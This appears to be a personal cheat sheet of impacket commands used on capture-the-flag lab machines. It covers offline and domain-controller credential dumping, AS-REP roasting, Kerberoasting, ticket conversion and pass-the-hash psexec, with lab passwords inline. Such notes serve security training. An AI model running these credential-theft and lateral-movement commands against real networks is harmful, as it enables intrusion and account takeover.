# impacket

## Wreath Commands

<!-- cmd: linux -->
```bash
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```
Used on: **Wreath**

extracted local NTLM hashes from saved SAM/SYSTEM hives.

### Dump credentials from DC
<!-- cmd: linux -->
```bash
impacket-secretsdump spookysec.local/backup:'backup2517860'@$TARGET
```
Used on: **AttacktiveDirectory**

Python suite implementing Windows/AD network protocols (SMB, Kerberos, MSSQL, WMI, DCERPC). Used for interactive MSSQL sessions, AS-REP roasting and Kerberoasting.

## Commands Used

### Interactive MSSQL session with Windows authentication
<!-- cmd: linux -->
```bash
impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@TARGET_IP -port 6520 -windows-auth
```
Used on: **Overwatch**

Inside the shell, useful built-ins include:
```
enum_users
enum_owner
```

### AS-REP Roasting
<!-- cmd: linux -->
```bash
impacket-GetNPUsers overwatch.htb/ -usersfile users.txt -dc-ip TARGET_IP -no-pass -format hashcat
```
Used on: **Overwatch**

`-no-pass` — enumerate only accounts with "Do not require Kerberos preauth"
- `-format hashcat` — output in hashcat-compatible format (mode 18200)

### Kerberoasting
<!-- cmd: linux -->
```bash
impacket-GetUserSPNs overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv' -dc-ip TARGET_IP -request
impacket-GetUserSPNs checkpoint.htb/alex.turner:'Checkpoint2024!' \
  -dc-ip 10.129.23.75 \
  -request-user mark.davies \
  -outputfile hash_rc4.txt
```
Used on: **Overwatch**, **Checkpoint**

`-request` — request TGS tickets and dump them in crackable format (mode 13100)

### Convert Kirbi to CCache
<!-- cmd: linux -->
```bash
impacket-ticketConverter /tmp/ryan2.kirbi /tmp/ryan2.ccache
export KRB5CCNAME=ryan.ccache
```
Used on: **Checkpoint**

### Dump Credentials From Offline Registry Hives
<!-- cmd: linux -->
```bash
impacket-secretsdump \
  -sam dump/registry.SAM.0xc30a3278e000.hive \
  -system dump/registry.SYSTEM.0xc30a2fe38000.hive \
  -security dump/registry.SECURITY.0xc30a32789000.hive \
  LOCAL
```
Used on: **Checkpoint**

### Pass-the-Hash Psexec
<!-- cmd: linux -->
```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> Administrator@$TARGET
```
Used on: **Checkpoint**


